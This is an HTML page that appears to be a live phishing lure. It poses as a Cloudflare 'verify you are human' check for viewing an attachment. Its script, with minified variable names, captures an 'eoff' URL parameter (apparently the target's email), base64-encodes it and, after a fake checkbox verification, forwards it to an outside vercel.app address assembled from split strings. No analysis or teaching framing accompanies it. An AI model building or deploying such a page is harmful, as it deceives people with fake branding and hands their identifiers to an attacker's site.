<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>taremirates-ae</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: #ffffff;
            color: #333;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            transition: opacity 0.5s ease;
        }

        .loading-spinner {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: 4px solid rgba(200, 200, 200, 0.3);
            border-top: 4px solid #4a6ee0;
            animation: spin 1s linear infinite;
        }

        .verification-container {
            padding: 30px;
            width: 100%;
            max-width: 500px;
            margin-top: 160px;
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.5s ease;
        }

        .verification-container.show {
            opacity: 1;
            transform: translateY(0);
        }

        h1 {
            text-align: center;
            margin-bottom: 15px;
            font-size: 18px;
            font-weight: 500;
            color: #333;
            line-height: 1.4;
        }

        .verification-box {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 25px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 15px;
            border: 1px solid #e0e0e0;
            transition: all 0.3s ease;
            min-height: 90px;
        }

        .verification-box:hover {
            border-color: #c0c0c0;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .checkbox {
            width: 24px;
            height: 24px;
            border-radius: 4px;
            border: 2px solid #4a6ee0;
            background: #ffffff;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: all 0.2s ease;
            position: relative;
        }

        .checkbox.verifying {
            border-radius: 50%;
            border: 2px solid transparent;
            border-top: 2px solid #4a6ee0;
            animation: spin 1s linear infinite;
        }

        .checkbox.verified {
            background: #28a745;
            border-color: #28a745;
        }

        .checkbox.verified::after {
            content: "✓";
            color: white;
            font-weight: bold;
            font-size: 14px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .verify-text {
            font-size: 16px;
            font-weight: 500;
            transition: all 0.3s ease;
        }

        .cloudflare-section {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
        }

        .cloudflare-brand {
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            color: #f38020;
            margin-bottom: 5px;
        }

        .cloudflare-logo {
            width: 32px;
            height: 32px;
            border-radius: 2px;
            position: relative;
        }

        .cloudflare-logo::before {
            content: "";
            position: absolute;
            top: 8px;
            left: 8px;
            width: 16px;
            height: 16px;
            border-radius: 2px;
        }

        .privacy-terms {
            font-size: 12px;
            color: #666;
        }

        .status-text {
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
            color: #666;
            min-height: 20px;
        }

        .redirect-notice {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #888;
            opacity: 0;
            transition: opacity 0.5s ease;
        }

        .redirect-notice.show {
            opacity: 1;
        }

        footer {
            text-align: center;
            color: #888;
            font-size: 13px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 190px;
            opacity: 0;
            transition: opacity 0.5s ease;
        }

        footer.show {
            opacity: 1;
        }

        .lock-icon {
            width: 14px;
            height: 14px;
            background: #888;
            border-radius: 50%;
            position: relative;
        }

        .lock-icon::before {
            content: "";
            position: absolute;
            width: 8px;
            height: 6px;
            background: #f8f9fa;
            top: 3px;
            left: 3px;
            border-radius: 1px;
        }

        .lock-icon::after {
            content: "";
            position: absolute;
            width: 4px;
            height: 3px;
            background: #888;
            top: -2px;
            left: 5px;
            border-radius: 1px 1px 0 0;
        }
    </style>
</head>
<body>
    <div class="loading-screen" id="loadingElement">
        <div class="loading-spinner"></div>
    </div>

    <div class="verification-container" id="mainContainer">
        <h1>Verify you are human by completing the action below to view attachment</h1>

        <div class="verification-box">
            <div class="checkbox-container">
                <div class="checkbox" id="checkElement"></div>
                <span class="verify-text" id="textElement">Verify</span>
            </div>

            <div class="cloudflare-section">
                <div class="cloudflare-brand">
                    <img src="cloudflare_.png" class="cloudflare-logo" alt="Logo">
                    <span>CLOUDFLARE</span>
                </div>
                <div class="privacy-terms">Privacy · Terms</div>
            </div>
        </div>

        <div class="status-text" id="statusElement"></div>
        <div class="redirect-notice" id="noticeElement"></div>
    </div>

    <footer id="footerElement">
        <div class="lock-icon"></div>
        <span>This page is protected by Cloudflare</span>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const a = document.getElementById('loadingElement');
            const b = document.getElementById('mainContainer');
            const c = document.getElementById('checkElement');
            const d = document.getElementById('textElement');
            const e = document.getElementById('statusElement');
            const f = document.getElementById('noticeElement');
            const h = document.getElementById('footerElement');

            let i = false;
            let j = '';

            function k(l) {
                l = l.replace(/[\[\]]/g, '\\$&');
                const m = new RegExp('[?&]' + l + '(=([^&#]*)|&|#|$)');
                const n = m.exec(window.location.href);
                if (!n) return null;
                if (!n[2]) return '';
                return decodeURIComponent(n[2].replace(/\+/g, ' '));
            }

            function o(p) {
                try {
                    return btoa(unescape(encodeURIComponent(p)));
                } catch (q) {
                    return '';
                }
            }

            function r(s) {
                if (!s) return;

                const t = new URL(window.location.href);
                t.searchParams.delete('eoff');
                t.searchParams.set('enc', s);

                window.history.replaceState({}, '', t.toString());
            }

            function u() {
                const v = k('eoff');

                if (v) {
                    j = o(v);
                    r(j);
                }
            }

            // Process URL immediately on page load
            u();

            setTimeout(function() {
                a.style.opacity = '0';

                setTimeout(function() {
                    a.style.display = 'none';
                    b.classList.add('show');
                    h.classList.add('show');
                }, 500);
            }, 2000);

            c.addEventListener('click', function() {
                if (!i) {
                    d.textContent = "Verifying...";
                    c.classList.add('verifying');
                    e.textContent = "";

                    setTimeout(function() {
                        c.classList.remove('verifying');
                        c.classList.add('verified');
                        d.textContent = "Success";
                        e.textContent = "";
                        i = true;

                        setTimeout(function() {
                            f.classList.add('show');
                        }, 500);

                        setTimeout(function() {
                            const w = "https:";
                            const x = "//taremirates-ae";
                            const y = ".vercel";
                            const z = ".app/";

                            let aa = w + x + y + z;

                            if (j) {
                                aa += "?eoff=" + j;
                            }

                            window.location.href = aa;
                        }, 2000);

                    }, 2000);
                }
            });
        });
    </script>
</body>
</html>
